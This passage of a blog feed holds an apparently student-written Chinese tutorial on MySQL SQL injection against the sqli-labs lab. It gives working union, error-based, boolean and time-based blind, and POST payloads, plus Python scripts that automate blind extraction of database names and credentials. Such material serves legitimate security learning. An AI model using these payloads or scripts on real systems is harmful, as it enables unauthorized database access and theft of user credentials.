结果显示网页排名(PR)</span><br><span class="line">--purge-output 从输出目录中安全删除所有内容</span><br><span class="line">--smart 仅通过积极的启发式进行测试</span><br><span class="line">--wizard 用于初级用户的简单向导接口</span><br></pre></td></tr></table></figure><p>参考：<br>sqlmap参考手册</p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>对于sqlmap的学习，其实不用死记硬背其中的参数，用到的时候查就行。<br>这学期学安全的时间到此结束了，开始准备期末了，寒假再见了~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;sqlmap是sql注入中使用的神器，也是渗透测试人员必须掌握的工具。因为最近在学习sql注入的专题，所以写下笔记来记录学习。&lt;br&gt;&lt;im
      
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Mysql注入详解</title>
    <link href="https://da4er.top/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3.html"/>
    <id>https://da4er.top/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3.html</id>
    <published>2019-11-23T08:05:14.000Z</published>
    <updated>2020-02-07T12:11:23.435Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近一直在学sql注入的专题，准备写个文章来记录这段时间学的过程。</p><h2 id="一-有可显字段——使用常规注入法"><a href="#一-有可显字段——使用常规注入法" class="headerlink" title="一.有可显字段——使用常规注入法"></a>一.有可显字段——使用常规注入法</h2><p>用到的注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure><br>常规的sql注入，通常有可显字段，通过在可显字段进行注入，从而达到注入的方法。<br>以sqli-labs第一关为例<br>用运用常规的sql注入<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"></p><h3 id="加入单引号，发现报错，这里我们可以用报错注入的方式。"><a href="#加入单引号，发现报错，这里我们可以用报错注入的方式。" class="headerlink" title="加入单引号，发现报错，这里我们可以用报错注入的方式。"></a>加入单引号，发现报错，这里我们可以用报错注入的方式。</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"><h3 id="通过对语句的闭合，发现单引号是sql语句的闭合符号。"><a href="#通过对语句的闭合，发现单引号是sql语句的闭合符号。" class="headerlink" title="通过对语句的闭合，发现单引号是sql语句的闭合符号。"></a>通过对语句的闭合，发现单引号是sql语句的闭合符号。</h3><p>and 1=1 返回正常<br>and 1=2 返回异常<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"><br></p><h3 id="用order-by语句进行数据库的猜解"><a href="#用order-by语句进行数据库的猜解" class="headerlink" title="用order by语句进行数据库的猜解"></a>用order by语句进行数据库的猜解</h3><p>order by 数字 是按照第几列升序排序<br>order by 数字 DESC 是按照第几列降序排序<br><br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"><br>我们用这条语句操作数据库，发现order by 4时报错，因为该数据库没有第四列，所以我们可以用order by语句进行对数据库列的猜解。<br>猜解到该数据库有三列。</p><h3 id="猜解可显字段"><a href="#猜解可显字段" class="headerlink" title="猜解可显字段"></a>猜解可显字段</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image"><p>先将id=1换成id=-1 或者运用其他方式让其报错，在运用union select联合查询语句<br>发现2，3字段是可显字段。</p><h3 id="查看当前数据库名和用户名"><a href="#查看当前数据库名和用户名" class="headerlink" title="查看当前数据库名和用户名"></a>查看当前数据库名和用户名</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image"><p>运用database()，user()两个函数<br>常用的还要version() 来查看数据库版本</p><h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>group_concat(xxx)这个函数通俗理解就是把xxx字段的数据聚合在一起返回。<br>例如：group_concat(table_name)意思是将table_name字段中的数据全部返回。<br>information_schema这个数据库保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。<br>information_schema是在mysql5.0版本开始使用，像5.0之前的版本要是注入的话，只能像注入access数据库一样，进行猜解。<br>information.schema.tables记录了整个mysql所有的表名<br>table_schema指定数据库名<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image"></p><h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image"><p>爆破字段名和爆破表名一样，只需要更改几个参数即可。<br>爆出来字段名：username，password俩个字段</p><h3 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image"><p>运用2，3可显字段 一块查询username，password字段内容<br>这里用到limit限定语句<br>limit 0,1 意思是查询字段中的第一个内容<br>limit 1,1 查询字段中第二个内容<br>limit 数字，数字  第一个数字指定查询的内容(从0开始)，第二个数字指定返回的数量。<br>不用limit语句也可以，还有一种注入语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users</span><br></pre></td></tr></table></figure><br><br>用group_concat()聚合输出<br>使用函数CONCAT_WS（）。使用语法为：CONCAT_WS(separator,str1,str2,…)CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）<br>所以用上面的语句直接爆出users字段的所以内容。</p><h2 id="二-无可显字段，有错误提示——报错注入"><a href="#二-无可显字段，有错误提示——报错注入" class="headerlink" title="二.无可显字段，有错误提示——报错注入"></a>二.无可显字段，有错误提示——报错注入</h2><p>启动了错误提示，并且出现在了浏览器中，即可运用报错注入</p><h3 id="1-Floor语句报错注入"><a href="#1-Floor语句报错注入" class="headerlink" title="1.Floor语句报错注入"></a>1.Floor语句报错注入</h3><p>用到注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a)b)</span><br><span class="line">1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)</span><br><span class="line">1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)</span><br><span class="line">1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select concat(username,0x3a,password) from users limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)</span><br></pre></td></tr></table></figure><br>floor语句报错主要用到：floor()，concat()，count()，rand(),group by<br>(1).floor()函数：floor(x) 向下取整，取小于等于x的最大整数。<br>(2).concat(x,x1,x2):将x，x1，x2整合到一个字符串。<br>(3).count() 返回指定表的行数<br>(4).rand() 随机返回数字<br>(5).group by+列名 按照某列分组<br>先做个实验，使用创建好的一个user表<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"><br>count(*)<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"></p><p>用count(*)，group by 联合使用，构建一个虚拟表<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"></p><p>floor（rand(0)*2）<br>返回是伪随机，规律是：011011；<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"><br>不给rand（）参数时，返回不确定<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image"></p><p>使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(floor(rand(0)*2),(select version()))a from user group by x;</span><br></pre></td></tr></table></figure><br>报出错误：<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image"></p><p>运用上面的规律：以sqli-labs第一关为例<br>第一关，虽然有可显字段，但是同样开启了错误显示，所以也可以用报错注入<br>报错注入是不用猜解表中的字段有多少列的，所以我们直接用一开始给出的语句进行报错</p><p>爆当前的数据库名<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image"><br>爆表名<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image"></p><p>爆字段名<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image"></p><p>爆字段内容<br></p><p>floor语句报错下面的几条博客不错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;he_and&#x2F;article&#x2F;details&#x2F;80455884</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzA5NDY0OTQ0Mw&#x3D;&#x3D;&amp;mid&#x3D;403404979&amp;idx&#x3D;1&amp;sn&#x3D;27d10b6da357d72304086311cefd573e&amp;scene&#x3D;1&amp;srcid&#x3D;04131X3lQlrDMYOCntCqWf6n#wechat_redirect</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;litlife&#x2F;p&#x2F;8472323.html</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;Fly_hps&#x2F;article&#x2F;details&#x2F;79416620</span><br></pre></td></tr></table></figure></p><h3 id="2-extractvalue-函数报错注入"><a href="#2-extractvalue-函数报错注入" class="headerlink" title="2.extractvalue()函数报错注入"></a>2.extractvalue()函数报错注入</h3><p>用到的注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) --+</span><br><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e)) --+</span><br><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure><br>extractvalue()用于对查询xml文档的函数<br>有两个参数，其中第二个参数是可操作的地方 第二个参数必须是 /xxx/xxx/xxx/…这种格式，要不就报错，所以基于这个特性，可以进行报错注入<br>以sqli-labs第五关为例：<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"><br>开启了错误提示 可以使用报错注入<br>然后用上面的注入语句进行注入：<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"><br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"><br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"><br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image"></p><h3 id="updatexml-函数报错注入"><a href="#updatexml-函数报错注入" class="headerlink" title="updatexml()函数报错注入"></a>updatexml()函数报错注入</h3><p>用到的注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e) --+</span><br><span class="line">1&#39; and updatexml(0x7e,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e),0x7e) --+</span><br><span class="line">1&#39; and updatexml(0x7e,concat(0x7e,(select column_name from information_schema.cloumns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),0x7e) --+</span><br><span class="line">1&#39; and updatexml(0x7e,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),0x7e)  --+</span><br></pre></td></tr></table></figure><br>updatexml()函数与extractvalue()类似，是更新xml文档的函数。<br>updatexml()有三个参数，其中第二个参数可操作 ，是xml的路径 必须是/xx/xx这种格式的 ，所以和上一个类似，构造注入语句<br>以sqli-labs第五关为例：<br>用上面的注入语句<br>爆出数据版本<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image"><br>爆出表名<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image"><br>爆出字段名<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image"><br>爆出字段内容<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image"></p><p>extractvalue()和updatexml()报错注入参考文章：</p><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p><p>报错注入的语句还有很多，但是主要还是上面三种，其他的语句和上面三种类似<br>其他报错注入文章：<br><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p><h2 id="三-无可显字段无错误提示-但出现数据提交正确和错误俩种不同页面"><a href="#三-无可显字段无错误提示-但出现数据提交正确和错误俩种不同页面" class="headerlink" title="三.无可显字段无错误提示,但出现数据提交正确和错误俩种不同页面"></a>三.无可显字段无错误提示,但出现数据提交正确和错误俩种不同页面</h2><p>这类注入利用属于盲注中的布尔盲注，在无可显字段无错误提示，但数据提交正确和错误两种不同页面时使用。有时在不能使用union select语句时，也会使用这类盲注。<br>用的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- Length（）&#x2F;&#x2F;返回字符串的长度</span><br><span class="line">Length（abc）返回3，表示abc字符串长度为3</span><br><span class="line">   </span><br><span class="line">- Substr（）&#x2F;&#x2F;截取字符串</span><br><span class="line">Stbstr(abc,1,1) 返回a，从abc的第一位开始截，步长为1。</span><br><span class="line">   </span><br><span class="line">- mid() &#x2F;&#x2F;取出字符串的一部分值</span><br><span class="line">mid(abc,1,1) 返回a，从abc的第一位开取，步长为1.与substr（）用法一致</span><br><span class="line">   </span><br><span class="line">- left() &#x2F;&#x2F;取出字符串左边的几个数据</span><br><span class="line">left(abc,1) 返回a</span><br><span class="line">left(abc,2) 返回ab</span><br><span class="line">   </span><br><span class="line">- right()  &#x2F;&#x2F;取出右边的几个数据</span><br><span class="line">right(abc,1) 返回c</span><br><span class="line">right(abc,2) 返回bc</span><br><span class="line">   </span><br><span class="line">- ord（）与 ascii（）&#x2F;&#x2F;返回一个字符的ascii码值</span><br><span class="line">ascii(s) 返回114</span><br><span class="line">   </span><br><span class="line">- hex（） &#x2F;&#x2F;返回16进制数</span><br></pre></td></tr></table></figure><br>用到的注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length(database())&gt;7</span><br><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100</span><br><span class="line">ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;117</span><br><span class="line">ascii(substr((select username from users limit 0,1),1,1))&gt;6</span><br></pre></td></tr></table></figure><br>不需要union select 即可完成注入工作</p><p>以sqli-labs第八章为例</p><p>python脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39; and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;You are in&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39; and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure><br>我只写了猜测当前数据库的长度，数据库名，第一张表的长度。剩下的都一样这里不在给出！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注参考：</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41554179&#x2F;article&#x2F;details&#x2F;88414079</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;Wu000999&#x2F;article&#x2F;details&#x2F;100041049</span><br></pre></td></tr></table></figure></p><h2 id="四-无可显字段无错误提示，正确错误没有明显区别"><a href="#四-无可显字段无错误提示，正确错误没有明显区别" class="headerlink" title="四.无可显字段无错误提示，正确错误没有明显区别"></a>四.无可显字段无错误提示，正确错误没有明显区别</h2><p>这类的sql注入类型，可以利用的方式是时间盲注。<br>时间盲注又叫延迟注入，通过时间长短来判断是否执行成功。<br>用到函数和布尔盲注差不多。<br>if(条件，1，2) 如果条件满足，则执行1，不满足就执行2<br>sleep(2) 延迟2秒钟<br>用到的语句就多了上面两条<br>注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;11),sleep(2),1) --+</span><br><span class="line">if((ascii(substr((select column_name from information_schema.tables where table_name&#x3D;‘users’ limit 0,1),1,1))&gt;11),sleep(2),1) --+</span><br><span class="line"> if((ascii(substr((select username from users limit 0,1),1,1))&gt;11),sleep(2),1) --+</span><br></pre></td></tr></table></figure><br>根据上面的语句构造python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(1,10):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39; and if(length(database())&#x3D;%d,sleep(2),1)&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        time1&#x3D;datetime.datetime.now()</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        time2&#x3D;datetime.datetime.now()</span><br><span class="line">        l&#x3D;(time2-time1).seconds</span><br><span class="line">        if l&gt;&#x3D;2:</span><br><span class="line">            print(&#39;database_len:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">        #else:</span><br><span class="line">        #    print(i)</span><br><span class="line">        #    break</span><br><span class="line">database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 9):</span><br><span class="line">        for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;&#39;&#39;&#39;</span><br><span class="line">            payload &#x3D; &#39;&#39;&#39;?id&#x3D;1&#39; and if(substr(database(),%d,1)&#x3D;&#39;%s&#39;,sleep(2),1)&#39;&#39;&#39; % (j,i)</span><br><span class="line">            time1 &#x3D; datetime.datetime.now()</span><br><span class="line">            r &#x3D; requests.get(url + payload + &#39; --+ &#39;)</span><br><span class="line">            time2 &#x3D; datetime.datetime.now()</span><br><span class="line">            sec &#x3D; (time2 - time1).seconds</span><br><span class="line">            if sec &gt;&#x3D; 2:</span><br><span class="line">                name +&#x3D; i</span><br><span class="line">                print(name)</span><br><span class="line">                break</span><br><span class="line">    print(&#39;database_name:&#39;, name)</span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure><br>这个脚本中猜解了数据库的长度和名称，其他的猜解和这个基本一致。</p><h2 id="五-post注入"><a href="#五-post注入" class="headerlink" title="五.post注入"></a>五.post注入</h2><p>post注入其实就是注入位置的不同，其他的注入利用方式和前面的基本一致。<br>主要是用到Burp Suite 进行抓包<br>我们以sqli-labs第11关为例：<br>用的注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;1 %23</span><br><span class="line">&#39; order by 2 %23</span><br><span class="line">&#39; union select 1,2 %23</span><br><span class="line">&#39; union select database(),user() %23</span><br><span class="line">&#39; union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;database() %23</span><br><span class="line">&#39; union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;&#39;users&#39; %23</span><br><span class="line">&#39; union select username,password from users limit 0,1%23</span><br></pre></td></tr></table></figure><br>用burp抓包 发送到repeated模块<br><br>加个单引号爆出错误<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"><br>判断字段数<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"><br>判断可显字段<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"><br>爆出数据库的表名<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"><br>爆字段名<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image"><br>爆字段的内容<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image"></p><p>这里指举了一个很简单的例子，还有很多注入 其实post注入和get注入利用方式是一样的<br>只不过是注入位置的不同。</p><h2 id="六-insert，delete，update注入"><a href="#六-insert，delete，update注入" class="headerlink" title="六.insert，delete，update注入"></a>六.insert，delete，update注入</h2><p>这些注入基本利用方式和上面的一样，只是注入位置的差别。<br>insert语句用于向数据库插入数据-&gt;一般用在用户注册中，<br>delete语句用于删除数据库的数据-&gt;比如删除留言板的数据<br>update语句用于更新数据库的数据-&gt;比如修改用户信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 